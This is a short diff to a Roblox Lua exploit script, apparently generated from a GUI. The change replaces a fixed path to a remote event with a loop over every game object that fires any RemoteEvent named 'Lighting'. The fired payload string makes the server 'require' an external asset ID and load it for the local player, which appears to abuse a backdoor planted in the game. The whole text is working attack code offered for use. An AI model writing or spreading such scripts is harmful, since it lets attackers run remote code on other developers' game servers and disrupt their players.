@@ -12,7 +12,11 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 local function WTBITG_fake_script() -- ScreenGui.LocalScript 
     local script = Instance.new('LocalScript', ScreenGui)
 
-    game.Workspace.MainModule.model1.model2.model3.model4.material.Lighting:FireServer("require(2609384717).load(".."'"..game.Players.LocalPlayer.Name.."'"..")", "Lightsource1", "Lightsource2")
+    for i,v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") and v.Name == "Lighting" then
+            v:FireServer("require(2609384717).load(".."'"..game.Players.LocalPlayer.Name.."'"..")", "Lightsource1", "Lightsource2")
+        end
+    end
     script.Parent:Destroy()
 end
 coroutine.wrap(WTBITG_fake_script)()
